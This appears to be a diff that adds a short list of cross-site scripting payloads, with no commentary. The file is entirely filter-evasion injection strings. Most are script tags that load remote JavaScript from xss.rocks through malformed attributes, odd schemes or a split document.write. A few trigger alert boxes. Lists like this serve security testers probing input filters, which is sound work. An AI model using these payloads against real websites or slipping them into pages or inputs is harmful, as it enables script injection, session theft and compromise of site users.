@@ -1,0 +1,14 @@
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+<SCRIPT SRC=//xss.rocks/.j>
+</script><script>alert('XSS');</script>
+¼script¾alert(¢XSS¢)¼/script¾
+<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
